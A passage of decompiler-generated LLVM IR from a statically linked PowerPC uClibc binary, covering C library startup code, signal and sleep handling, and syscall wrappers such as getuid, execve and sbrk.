  %v3_100115a0 = inttoptr i32 %v2_100115a0 to i32*
  store i32 %v0_100115a0.pre, i32* %v3_100115a0, align 4
  %v0_100115a4 = load i32, i32* %r11.global-to-local, align 4
  %v1_100115a4 = add i32 %v0_100115a4, -1
  store i32 %v1_100115a4, i32* %r11.global-to-local, align 4
  %v1_100115a8 = mul i32 %v1_100115a4, 4
  %v1_100115ac = load i32, i32* %r8.global-to-local, align 4
  %v2_100115ac = add i32 %v1_100115ac, %v1_100115a8
  %v0_100115b0 = load i32, i32* %ctr.global-to-local, align 4
  %v1_100115b0 = add i32 %v0_100115b0, -1
  store i32 %v1_100115b0, i32* %ctr.global-to-local, align 4
  %v2_100115b0 = icmp eq i32 %v1_100115b0, 0
  br i1 %v2_100115b0, label %dec_label_pc_100115b4, label %dec_label_pc_100115a0.dec_label_pc_100115a0_crit_edge

dec_label_pc_100115b4:                            ; preds = %dec_label_pc_100115a0.dec_label_pc_100115a0_crit_edge, %dec_label_pc_100115a0.lr.ph
  store i32 %v2_10011534, i32* @r3, align 4
  store i32 17, i32* @r4, align 4
  %v0_100115bc = call i32 @__sigaddset()
  store i32 %v0_100115bc, i32* %r3.global-to-local, align 4
  %v1_100115c0 = icmp slt i32 %v0_100115bc, 0
  br i1 %v1_100115c0, label %dec_label_pc_100116ac, label %dec_label_pc_100115c8

dec_label_pc_100115c8:                            ; preds = %dec_label_pc_100115b4
  store i32 17, i32* %r3.global-to-local, align 4
  %v2_100115d0 = ptrtoint i32* %stack_var_-176 to i32
  store i32 268506584, i32* @lr, align 4
  %v4_100115d4 = call i32 @__libc_sigaction(i32 17, i32* null, i32 %v2_100115d0)
  store i32 %v4_100115d4, i32* %r3.global-to-local, align 4
  %tmp30 = icmp sgt i32 %v4_100115d4, -1
  br i1 %tmp30, label %dec_label_pc_10011608, label %dec_label_pc_100115e0

dec_label_pc_100115e0:                            ; preds = %dec_label_pc_100115c8
  %v0_100115e0 = call i32 @__errno_location()
  store i32 %v0_100115e0, i32* %r3.global-to-local, align 4
  %v1_100115e8 = inttoptr i32 %v0_100115e0 to i32*
  %v2_100115e8 = load i32, i32* %v1_100115e8, align 4
  store i32 %v0_100115e0, i32* %r29.global-to-local, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268506620, i32* @lr, align 4
  %v3_100115f8 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10011558, i32 0)
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_10011600 = inttoptr i32 %v0_100115e0 to i32*
  store i32 %v2_100115e8, i32* %v2_10011600, align 4
  %v0_100116c0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116b0

dec_label_pc_10011608:                            ; preds = %dec_label_pc_100115c8
  %v3_10011608 = load i32, i32* %stack_var_-176, align 4
  %v3_10011614 = icmp eq i32 %v3_10011608, 1
  br i1 %v3_10011614, label %dec_label_pc_1001161c, label %dec_label_pc_10011650

dec_label_pc_1001161c:                            ; preds = %dec_label_pc_10011608
  store i32 %v2_10011514, i32* %r3.global-to-local, align 4
  store i32 268506664, i32* @lr, align 4
  %v2_10011624 = call i32 @__libc_nanosleep(i32 %v2_10011514, i32 %v2_10011514)
  store i32 %v2_10011624, i32* %r3.global-to-local, align 4
  store i32 %v2_10011624, i32* @r31, align 4
  %v0_1001162c = call i32 @__errno_location()
  store i32 %v0_1001162c, i32* %r3.global-to-local, align 4
  store i32 %v0_1001162c, i32* %r29.global-to-local, align 4
  %v1_1001163c = inttoptr i32 %v0_1001162c to i32*
  %v2_1001163c = load i32, i32* %v1_1001163c, align 4
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268506696, i32* @lr, align 4
  %v3_10011644 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10011558, i32 0)
  store i32 %v3_10011644, i32* %r3.global-to-local, align 4
  %v1_10011648 = load i32, i32* %r29.global-to-local, align 4
  %v2_10011648 = inttoptr i32 %v1_10011648 to i32*
  store i32 %v2_1001163c, i32* %v2_10011648, align 4
  %v0_10011678.pr = load i32, i32* @r31, align 4
  br label %dec_label_pc_10011678

dec_label_pc_10011650:                            ; preds = %dec_label_pc_10011608
  store i32 2, i32* %r3.global-to-local, align 4
  store i32 268506720, i32* @lr, align 4
  %v3_1001165c = call i32 @__GI_sigprocmask(i32 2, i32 %v2_10011558, i32 0)
  br label %dec_label_pc_1001166c

dec_label_pc_1001166c:                            ; preds = %dec_label_pc_10011574, %dec_label_pc_10011650
  store i32 %v2_10011514, i32* %r3.global-to-local, align 4
  store i32 268506740, i32* @lr, align 4
  %v2_10011670 = call i32 @__libc_nanosleep(i32 %v2_10011514, i32 %v2_10011514)
  store i32 %v2_10011670, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10011678

dec_label_pc_10011678:                            ; preds = %dec_label_pc_1001161c, %dec_label_pc_1001166c
  %v0_10011678 = phi i32 [ %v0_10011678.pr, %dec_label_pc_1001161c ], [ %v2_10011670, %dec_label_pc_1001166c ]
  %v3_10011678 = icmp eq i32 %v0_10011678, 0
  br i1 %v3_10011678, label %dec_label_pc_100116a4, label %dec_label_pc_10011680

dec_label_pc_10011680:                            ; preds = %dec_label_pc_10011678
  %v3_10011690 = load i32, i32* %stack_var_-440, align 4
  %v0_10011694 = call i32 @__asm_mfcr()
  store i32 %v0_10011694, i32* %r3.global-to-local, align 4
  %v1_10011698 = call i32 @__asm_rlwinm(i32 %v0_10011694, i32 30, i32 31, i32 31)
  %v2_1001169c = add i32 %v3_10011690, %v1_10011698
  store i32 %v2_1001169c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116b0

dec_label_pc_100116a4:                            ; preds = %dec_label_pc_10011678, %entry
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116b0

dec_label_pc_100116ac:                            ; preds = %dec_label_pc_10011558, %dec_label_pc_100115b4, %dec_label_pc_10011534
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100116b0

dec_label_pc_100116b0:                            ; preds = %dec_label_pc_100116a4, %dec_label_pc_10011680, %dec_label_pc_100115e0, %dec_label_pc_100116ac
  %v0_100116c0 = phi i32 [ 0, %dec_label_pc_100116a4 ], [ %v2_1001169c, %dec_label_pc_10011680 ], [ %v0_100116c0.pre, %dec_label_pc_100115e0 ], [ -1, %dec_label_pc_100116ac ]
  ret i32 %v0_100116c0

; uselistorder directives
  uselistorder i32 %v1_100115b0, { 1, 0 }
  uselistorder i32 %v2_10011558, { 2, 1, 0, 4, 3, 5 }
  uselistorder i32 %v1_10011530, { 1, 0 }
  uselistorder i32 %v2_10011514, { 2, 1, 3, 6, 5, 4, 7, 0, 8 }
  uselistorder i32* %r8.global-to-local, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r7.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r3.global-to-local, { 3, 5, 4, 1, 6, 2, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17, 18, 19, 20, 21, 22, 23, 24, 0 }
  uselistorder i32* %r11.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32* %ctr.global-to-local, { 3, 2, 0, 6, 7, 5, 4, 1, 8, 9 }
  uselistorder i32 (i32, i32)* @__libc_nanosleep, { 1, 0 }
  uselistorder i32 (i32, i32)* @__sigismember, { 1, 0 }
  uselistorder label %dec_label_pc_100116b0, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_100116ac, { 1, 0, 2 }
  uselistorder label %dec_label_pc_10011678, { 1, 0 }
  uselistorder label %dec_label_pc_1001166c, { 1, 0 }
  uselistorder label %dec_label_pc_100115a0.dec_label_pc_100115a0_crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10011520.dec_label_pc_10011520_crit_edge, { 1, 0 }
}

define i32 @__GI___uClibc_fini(i32 %arg1) local_unnamed_addr {
dec_label_pc_10011714:
  %v3_10011718 = load i32, i32* @global_var_1002c934.1114, align 4
  %v3_1001171c = icmp eq i32 %v3_10011718, 0
  br i1 %v3_1001171c, label %dec_label_pc_1001172c, label %dec_label_pc_10011724

dec_label_pc_10011724:                            ; preds = %dec_label_pc_10011714
  %v2_10011728 = load i32, i32* @r4, align 4
  %v3_10011728 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_10011728)
  store i32 %v3_10011728, i32* @r3, align 4
  br label %dec_label_pc_1001172c

dec_label_pc_1001172c:                            ; preds = %dec_label_pc_10011714, %dec_label_pc_10011724
  %v3_10011730 = load i32, i32* @global_var_1002c938.1115, align 4
  %v3_10011734 = icmp eq i32 %v3_10011730, 0
  br i1 %v3_10011734, label %dec_label_pc_1001172c.dec_label_pc_10011744_crit_edge, label %dec_label_pc_1001173c

dec_label_pc_1001172c.dec_label_pc_10011744_crit_edge: ; preds = %dec_label_pc_1001172c
  %v0_10011754.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011744

dec_label_pc_1001173c:                            ; preds = %dec_label_pc_1001172c
  %v2_10011740 = load i32, i32* @r4, align 4
  %v3_10011740 = call i32 @unknown_0(i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 %v2_10011740)
  br label %dec_label_pc_10011744

dec_label_pc_10011744:                            ; preds = %dec_label_pc_1001172c.dec_label_pc_10011744_crit_edge, %dec_label_pc_1001173c
  %v0_10011754 = phi i32 [ %v0_10011754.pre, %dec_label_pc_1001172c.dec_label_pc_10011744_crit_edge ], [ %v3_10011740, %dec_label_pc_1001173c ]
  ret i32 %v0_10011754

; uselistorder directives
  uselistorder i32 (i32, i32)* @unknown_0, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10011744, { 1, 0 }
  uselistorder label %dec_label_pc_1001172c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_return_void() local_unnamed_addr {
entry:
  %v0_10011760 = load i32, i32* @r3, align 4
  ret i32 %v0_10011760
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r30, align 4
  store i32 %arg1, i32* @r31, align 4
  store i32 268507016, i32* @lr, align 4
  %v2_10011784 = call i32 @__libc_fcntl(i32 1, i32 1)
  %v3_10011788 = icmp eq i32 %v2_10011784, -1
  br i1 %v3_10011788, label %dec_label_pc_10011790, label %dec_label_pc_100117b0

dec_label_pc_10011790:                            ; preds = %entry
  %v0_10011794 = load i32, i32* @r30, align 4
  store i32 268507044, i32* @lr, align 4
  %v3_100117a0 = call i32 @__libc_open(i32 ptrtoint ([10 x i8]* @global_var_1001bf6c.1116 to i32), i32 %v0_10011794)
  %v1_100117a4 = load i32, i32* @r31, align 4
  %v4_100117a4 = icmp eq i32 %v3_100117a0, %v1_100117a4
  br i1 %v4_100117a4, label %dec_label_pc_100117b0, label %dec_label_pc_100117ac

dec_label_pc_100117ac:                            ; preds = %dec_label_pc_10011790
  %v1_100117ac = call i32 @abort(i32 %v3_100117a0)
  br label %dec_label_pc_100117b0

dec_label_pc_100117b0:                            ; preds = %entry, %dec_label_pc_10011790, %dec_label_pc_100117ac
  %v0_100117c0 = phi i32 [ %v2_10011784, %entry ], [ %v3_100117a0, %dec_label_pc_10011790 ], [ %v1_100117ac, %dec_label_pc_100117ac ]
  ret i32 %v0_100117c0

; uselistorder directives
  uselistorder label %dec_label_pc_100117b0, { 2, 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %v3_100117e4 = load i32, i32* @global_var_1002c93c.1117, align 4
  %v3_100117e8 = icmp eq i32 %v3_100117e4, 0
  br i1 %v3_100117e8, label %dec_label_pc_1001180c, label %entry.dec_label_pc_10011830_crit_edge

entry.dec_label_pc_10011830_crit_edge:            ; preds = %entry
  %v0_10011840.pre = load i32, i32* @r3, align 4
  br label %dec_label_pc_10011830

dec_label_pc_1001180c:                            ; preds = %entry
  store i32 1, i32* @global_var_1002c93c.1117, align 4
  store i32 4096, i32* @global_var_1002c930.1091, align 4
  %v1_1001182c = call i32 @_stdio_init(i32 268492880)
  br label %dec_label_pc_10011830

dec_label_pc_10011830:                            ; preds = %entry.dec_label_pc_10011830_crit_edge, %dec_label_pc_1001180c
  %v0_10011840 = phi i32 [ %v0_10011840.pre, %entry.dec_label_pc_10011830_crit_edge ], [ %v1_1001182c, %dec_label_pc_1001180c ]
  ret i32 %v0_10011840

; uselistorder directives
  uselistorder label %dec_label_pc_10011830, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  %tmp25 = call i32 @__decompiler_undefined_function_0()
  %tmp26 = call i32 @__decompiler_undefined_function_0()
  %tmp27 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-168 = alloca i32, align 4
  store i32 %tmp, i32* @r30, align 4
  %v1_1001185c = mul i32 %arg2, 4
  %v2_10011860 = add i32 %tmp, %v1_1001185c
  %v0_10011864 = load i32, i32* @r9, align 4
  store i32 %v0_10011864, i32* @global_var_1002c928.1118, align 4
  %v1_10011868 = add i32 %v2_10011860, 4
  store i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32* %r29.global-to-local, align 4
  store i32 %v1_10011868, i32* @global_var_1002c92c.1112, align 4
  store i32 %arg6, i32* @global_var_1002c938.1115, align 4
  store i32 %arg2, i32* @r26, align 4
  store i32 %arg1, i32* @r25, align 4
  store i32 %arg4, i32* @r28, align 4
  %v2_10011888 = load i32, i32* %arg3, align 4
  store i32 %arg5, i32* @r27, align 4
  %v4_10011890 = icmp eq i32 %v1_10011868, %v2_10011888
  br i1 %v4_10011890, label %dec_label_pc_10011898, label %dec_label_pc_1001189c

dec_label_pc_10011898:                            ; preds = %entry
  store i32 %v2_10011860, i32* @global_var_1002c92c.1112, align 4
  br label %dec_label_pc_1001189c

dec_label_pc_1001189c:                            ; preds = %entry, %dec_label_pc_10011898
  %v2_1001189c = ptrtoint i32* %stack_var_-168 to i32
  store i32 268507308, i32* @lr, align 4
  %v3_100118a8 = call i32 @__GI_memset(i32 %v2_1001189c, i32 0, i32 120)
  %storemerge.pre = load i32, i32* @global_var_1002c92c.1112, align 4
  br label %dec_label_pc_100118b8

dec_label_pc_100118b8:                            ; preds = %dec_label_pc_100118b8, %dec_label_pc_1001189c
  %storemerge = phi i32 [ %storemerge.pre, %dec_label_pc_1001189c ], [ %v1_100118bc, %dec_label_pc_100118b8 ]
  %v1_100118b8 = inttoptr i32 %storemerge to i32*
  %v2_100118b8 = load i32, i32* %v1_100118b8, align 4
  %v1_100118bc = add i32 %storemerge, 4
  %v3_100118c0 = icmp eq i32 %v2_100118b8, 0
  br i1 %v3_100118c0, label %dec_label_pc_100118c8, label %dec_label_pc_100118b8

dec_label_pc_100118c8:                            ; preds = %dec_label_pc_100118b8
  store i32 %v1_100118bc, i32* %r29.global-to-local, align 4
  %v1_100118f412 = inttoptr i32 %v1_100118bc to i32*
  %v2_100118f413 = load i32, i32* %v1_100118f412, align 4
  %v3_100118f816 = icmp eq i32 %v2_100118f413, 0
  br i1 %v3_100118f816, label %dec_label_pc_10011900, label %dec_label_pc_100118d0

dec_label_pc_100118d0:                            ; preds = %dec_label_pc_100118c8, %dec_label_pc_100118f0
  %v0_100118e4 = phi i32 [ %v1_100118f0, %dec_label_pc_100118f0 ], [ %v1_100118bc, %dec_label_pc_100118c8 ]
  %v0_100118d8 = phi i32 [ %v2_100118f4, %dec_label_pc_100118f0 ], [ %v2_100118f413, %dec_label_pc_100118c8 ]
  %v2_100118d0 = icmp ugt i32 %v0_100118d8, 14
  br i1 %v2_100118d0, label %dec_label_pc_100118f0, label %dec_label_pc_100118d8

dec_label_pc_100118d8:                            ; preds = %dec_label_pc_100118d0
  %v1_100118d8 = mul i32 %v0_100118d8, 8
  %v2_100118e0 = add i32 %v1_100118d8, %v2_1001189c
  store i32 %v2_100118e0, i32* @r3, align 4
  store i32 %v0_100118e4, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268507376, i32* @lr, align 4
  %v0_100118ec = call i32 @memcpy()
  %v0_100118f0.pre = load i32, i32* %r29.global-to-local, align 4
  br label %dec_label_pc_100118f0

dec_label_pc_100118f0:                            ; preds = %dec_label_pc_100118d0, %dec_label_pc_100118d8
  %v0_100118f0 = phi i32 [ %v0_100118e4, %dec_label_pc_100118d0 ], [ %v0_100118f0.pre, %dec_label_pc_100118d8 ]
  %v1_100118f0 = add i32 %v0_100118f0, 8
  store i32 %v1_100118f0, i32* %r29.global-to-local, align 4
  %v1_100118f4 = inttoptr i32 %v1_100118f0 to i32*
  %v2_100118f4 = load i32, i32* %v1_100118f4, align 4
  %v3_100118f8 = icmp eq i32 %v2_100118f4, 0
  br i1 %v3_100118f8, label %dec_label_pc_10011900, label %dec_label_pc_100118d0

dec_label_pc_10011900:                            ; preds = %dec_label_pc_100118f0, %dec_label_pc_100118c8
  %v1_10011904 = call i32 @_dl_aux_init(i32 %v2_1001189c)
  store i32 %v1_10011904, i32* @r3, align 4
  store i32 268507404, i32* @lr, align 4
  %v1_10011908 = call i32 @__GI___uClibc_init(i32 %v1_10011904)
  %v3_10011910 = icmp eq i32 %tmp27, 0
  br i1 %v3_10011910, label %dec_label_pc_10011918, label %dec_label_pc_1001191c

dec_label_pc_10011918:                            ; preds = %dec_label_pc_10011900
  br label %dec_label_pc_1001191c

dec_label_pc_1001191c:                            ; preds = %dec_label_pc_10011900, %dec_label_pc_10011918
  %v0_10011924 = phi i32 [ %tmp27, %dec_label_pc_10011900 ], [ 4096, %dec_label_pc_10011918 ]
  store i32 %v0_10011924, i32* @global_var_1002c930.1091, align 4
  %v3_10011928 = icmp eq i32 %tmp26, -1
  br i1 %v3_10011928, label %dec_label_pc_10011930, label %dec_label_pc_10011964

dec_label_pc_10011930:                            ; preds = %dec_label_pc_1001191c
  store i32 268507444, i32* @lr, align 4
  %v1_10011930 = call i32 @getuid(i32 ptrtoint (i32* @global_var_10030000.1 to i32))
  store i32 %v1_10011930, i32* %r29.global-to-local, align 4
  store i32 268507452, i32* @lr, align 4
  %v0_10011938 = call i32 @geteuid()
  %v4_1001193c = icmp eq i32 %v1_10011930, %v0_10011938
  br i1 %v4_1001193c, label %dec_label_pc_10011944, label %dec_label_pc_10011980

dec_label_pc_10011944:                            ; preds = %dec_label_pc_10011930
  store i32 268507464, i32* @lr, align 4
  %v1_10011944 = call i32 @getgid(i32 %v0_10011938)
  store i32 %v1_10011944, i32* %r29.global-to-local, align 4
  store i32 268507472, i32* @lr, align 4
  %v0_1001194c = call i32 @getegid()
  %v4_10011950 = icmp eq i32 %v1_10011944, %v0_1001194c
  br i1 %v4_10011950, label %dec_label_pc_10011958.thread, label %dec_label_pc_10011980

dec_label_pc_10011958.thread:                     ; preds = %dec_label_pc_10011944
  br label %dec_label_pc_100119b0

dec_label_pc_10011964:                            ; preds = %dec_label_pc_1001191c
  %v4_10011968 = icmp eq i32 %tmp26, %tmp25
  br i1 %v4_10011968, label %dec_label_pc_10011970, label %dec_label_pc_10011980

dec_label_pc_10011970:                            ; preds = %dec_label_pc_10011964
  br label %dec_label_pc_10011980

dec_label_pc_10011980:                            ; preds = %dec_label_pc_10011970, %dec_label_pc_10011964, %dec_label_pc_10011944, %dec_label_pc_10011930
  store i32 268507536, i32* @lr, align 4
  %v2_1001198c = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 268507552, i32* @lr, align 4
  %v2_1001199c = call i32 @__check_one_fd(i32 1, i32 32770)
  store i32 268507568, i32* @lr, align 4
  %v2_100119ac = call i32 @__check_one_fd(i32 2, i32 32770)
  br label %dec_label_pc_100119b0

dec_label_pc_100119b0:                            ; preds = %dec_label_pc_10011958.thread, %dec_label_pc_10011980
  %v0_100119bc = load i32, i32* @r30, align 4
  %v1_100119bc = inttoptr i32 %v0_100119bc to i32*
  %v2_100119bc = load i32, i32* %v1_100119bc, align 4
  store i32 0, i32* %r29.global-to-local, align 4
  store i32 %v2_100119bc, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_10030000.1 to i32), i32 -14124) to i32*), align 4
  %v0_100119dc = load i32, i32* @r27, align 4
  store i32 %v0_100119dc, i32* @global_var_1002c934.1114, align 4
  br i1 false, label %dec_label_pc_100119e4, label %dec_label_pc_10011a5c

dec_label_pc_100119e4:                            ; preds = %dec_label_pc_100119b0, %dec_label_pc_100119e4
  br i1 undef, label %dec_label_pc_100119e4, label %dec_label_pc_10011a5c

dec_label_pc_10011a5c:                            ; preds = %dec_label_pc_100119e4, %dec_label_pc_100119b0
  %v0_10011a08 = load i32, i32* @r28, align 4
  call void @__pseudo_call(i32 %v0_10011a08)
  store i32 0, i32* %r29.global-to-local, align 4
  %v0_10011a6c = call i32 @__errno_location()
  %v2_10011a74 = inttoptr i32 %v0_10011a6c to i32*
  store i32 0, i32* %v2_10011a74, align 4
  %v0_10011a88 = call i32 @__GI___h_errno_location()
  %v2_10011a90 = inttoptr i32 %v0_10011a88 to i32*
  store i32 0, i32* %v2_10011a90, align 4
  %v0_10011aa0 = load i32, i32* @r25, align 4
  call void @__pseudo_call(i32 %v0_10011aa0)
  %v0_10011aac = call i32 @__GI_exit()
  ret i32 %v0_10011aac

; uselistorder directives
  uselistorder i32 %v2_100118f4, { 1, 0 }
  uselistorder i32 %v1_100118f0, { 2, 1, 0 }
  uselistorder i32 %v1_100118bc, { 0, 2, 1, 3 }
  uselistorder i32 %storemerge, { 1, 0 }
  uselistorder i32 %v2_1001189c, { 1, 0, 2 }
  uselistorder i32* %r29.global-to-local, { 1, 2, 3, 4, 6, 5, 0, 7 }
  uselistorder i32 ()* @__GI_exit, { 0, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32)* @__check_one_fd, { 2, 1, 0 }
  uselistorder i32 14, { 3, 0, 2, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_100119e4, { 1, 0 }
  uselistorder label %dec_label_pc_100119b0, { 1, 0 }
  uselistorder label %dec_label_pc_1001191c, { 1, 0 }
  uselistorder label %dec_label_pc_100118f0, { 1, 0 }
  uselistorder label %dec_label_pc_100118d0, { 1, 0 }
  uselistorder label %dec_label_pc_1001189c, { 1, 0 }
}

define i32 @__syscall_error() local_unnamed_addr {
entry:
  %v0_10011abc = load i32, i32* @r3, align 4
  store i32 %v0_10011abc, i32* @r29, align 4
  %v0_10011ac4 = call i32 @__errno_location()
  %v0_10011ac8 = load i32, i32* @r29, align 4
  %v2_10011ac8 = inttoptr i32 %v0_10011ac4 to i32*
  store i32 %v0_10011ac8, i32* %v2_10011ac8, align 4
  ret i32 -1
}

define i32 @__socketcall(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011afc = call i32 @__asm_mfcr()
  %v1_10011b00 = and i32 %v0_10011afc, 268435456
  %v3_10011b00 = icmp eq i32 %v1_10011b00, 0
  store i32 %v0_10011afc, i32* %r31.global-to-local, align 4
  br i1 %v3_10011b00, label %dec_label_pc_10011b18, label %dec_label_pc_10011b0c

dec_label_pc_10011b0c:                            ; preds = %entry
  %v0_10011b0c = call i32 @__errno_location()
  %v0_10011b10 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011b10 = inttoptr i32 %v0_10011b0c to i32*
  store i32 %v0_10011b10, i32* %v2_10011b10, align 4
  br label %dec_label_pc_10011b18

dec_label_pc_10011b18:                            ; preds = %entry, %dec_label_pc_10011b0c
  %v0_10011b28 = phi i32 [ %v0_10011afc, %entry ], [ -1, %dec_label_pc_10011b0c ]
  ret i32 %v0_10011b28

; uselistorder directives
  uselistorder label %dec_label_pc_10011b18, { 1, 0 }
}

define i32 @__GI_execve(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011b44 = call i32 @__asm_mfcr()
  %v1_10011b48 = and i32 %v0_10011b44, 268435456
  %v3_10011b48 = icmp eq i32 %v1_10011b48, 0
  store i32 %v0_10011b44, i32* %r31.global-to-local, align 4
  br i1 %v3_10011b48, label %dec_label_pc_10011b60, label %dec_label_pc_10011b54

dec_label_pc_10011b54:                            ; preds = %entry
  %v0_10011b54 = call i32 @__errno_location()
  %v0_10011b58 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011b58 = inttoptr i32 %v0_10011b54 to i32*
  store i32 %v0_10011b58, i32* %v2_10011b58, align 4
  br label %dec_label_pc_10011b60

dec_label_pc_10011b60:                            ; preds = %entry, %dec_label_pc_10011b54
  %v0_10011b70 = phi i32 [ %v0_10011b44, %entry ], [ -1, %dec_label_pc_10011b54 ]
  ret i32 %v0_10011b70

; uselistorder directives
  uselistorder label %dec_label_pc_10011b60, { 1, 0 }
}

define i32 @getegid() local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011b8c = call i32 @__asm_mfcr()
  %v1_10011b90 = and i32 %v0_10011b8c, 268435456
  %v3_10011b90 = icmp eq i32 %v1_10011b90, 0
  store i32 %v0_10011b8c, i32* %r31.global-to-local, align 4
  br i1 %v3_10011b90, label %dec_label_pc_10011ba8, label %dec_label_pc_10011b9c

dec_label_pc_10011b9c:                            ; preds = %entry
  %v0_10011b9c = call i32 @__errno_location()
  %v0_10011ba0 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011ba0 = inttoptr i32 %v0_10011b9c to i32*
  store i32 %v0_10011ba0, i32* %v2_10011ba0, align 4
  br label %dec_label_pc_10011ba8

dec_label_pc_10011ba8:                            ; preds = %entry, %dec_label_pc_10011b9c
  %v0_10011bb8 = phi i32 [ %v0_10011b8c, %entry ], [ -1, %dec_label_pc_10011b9c ]
  ret i32 %v0_10011bb8

; uselistorder directives
  uselistorder label %dec_label_pc_10011ba8, { 1, 0 }
}

define i32 @getgid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011bd4 = call i32 @__asm_mfcr()
  %v1_10011bd8 = and i32 %v0_10011bd4, 268435456
  %v3_10011bd8 = icmp eq i32 %v1_10011bd8, 0
  store i32 %v0_10011bd4, i32* %r31.global-to-local, align 4
  br i1 %v3_10011bd8, label %dec_label_pc_10011bf0, label %dec_label_pc_10011be4

dec_label_pc_10011be4:                            ; preds = %entry
  %v0_10011be4 = call i32 @__errno_location()
  %v0_10011be8 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011be8 = inttoptr i32 %v0_10011be4 to i32*
  store i32 %v0_10011be8, i32* %v2_10011be8, align 4
  br label %dec_label_pc_10011bf0

dec_label_pc_10011bf0:                            ; preds = %entry, %dec_label_pc_10011be4
  %v0_10011c00 = phi i32 [ %v0_10011bd4, %entry ], [ -1, %dec_label_pc_10011be4 ]
  ret i32 %v0_10011c00

; uselistorder directives
  uselistorder label %dec_label_pc_10011bf0, { 1, 0 }
}

define i32 @getuid(i32 %arg1) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011c1c = call i32 @__asm_mfcr()
  %v1_10011c20 = and i32 %v0_10011c1c, 268435456
  %v3_10011c20 = icmp eq i32 %v1_10011c20, 0
  store i32 %v0_10011c1c, i32* %r31.global-to-local, align 4
  br i1 %v3_10011c20, label %dec_label_pc_10011c38, label %dec_label_pc_10011c2c

dec_label_pc_10011c2c:                            ; preds = %entry
  %v0_10011c2c = call i32 @__errno_location()
  %v0_10011c30 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011c30 = inttoptr i32 %v0_10011c2c to i32*
  store i32 %v0_10011c30, i32* %v2_10011c30, align 4
  br label %dec_label_pc_10011c38

dec_label_pc_10011c38:                            ; preds = %entry, %dec_label_pc_10011c2c
  %v0_10011c48 = phi i32 [ %v0_10011c1c, %entry ], [ -1, %dec_label_pc_10011c2c ]
  ret i32 %v0_10011c48

; uselistorder directives
  uselistorder label %dec_label_pc_10011c38, { 1, 0 }
}

define i32 @__libc_nanosleep(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r31.global-to-local = alloca i32, align 4
  %v0_10011c64 = call i32 @__asm_mfcr()
  %v1_10011c68 = and i32 %v0_10011c64, 268435456
  %v3_10011c68 = icmp eq i32 %v1_10011c68, 0
  store i32 %v0_10011c64, i32* %r31.global-to-local, align 4
  br i1 %v3_10011c68, label %dec_label_pc_10011c80, label %dec_label_pc_10011c74

dec_label_pc_10011c74:                            ; preds = %entry
  %v0_10011c74 = call i32 @__errno_location()
  %v0_10011c78 = load i32, i32* %r31.global-to-local, align 4
  %v2_10011c78 = inttoptr i32 %v0_10011c74 to i32*
  store i32 %v0_10011c78, i32* %v2_10011c78, align 4
  br label %dec_label_pc_10011c80

dec_label_pc_10011c80:                            ; preds = %entry, %dec_label_pc_10011c74
  %v0_10011c90 = phi i32 [ %v0_10011c64, %entry ], [ -1, %dec_label_pc_10011c74 ]
  ret i32 %v0_10011c90

; uselistorder directives
  uselistorder label %dec_label_pc_10011c80, { 1, 0 }
}

define i32 @__GI_sbrk(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r30, align 4
  %v3_10011cb0 = load i32, i32* @global_var_1002c960.1121, align 4
  %v3_10011cb4 = icmp eq i32 %v3_10011cb0, 0
  br i1 %v3_10011cb4, label %dec_label_pc_10011cbc, label %dec_label_pc_10011cc8

dec_label_pc_10011cbc:                            ; preds = %entry
  store i32 268508352, i32* @lr, align 4
  %v1_10011cbc = call i32 @__GI_brk(i32 0)
  %v1_10011cc0 = icmp slt i32 %v1_10011cbc, 0
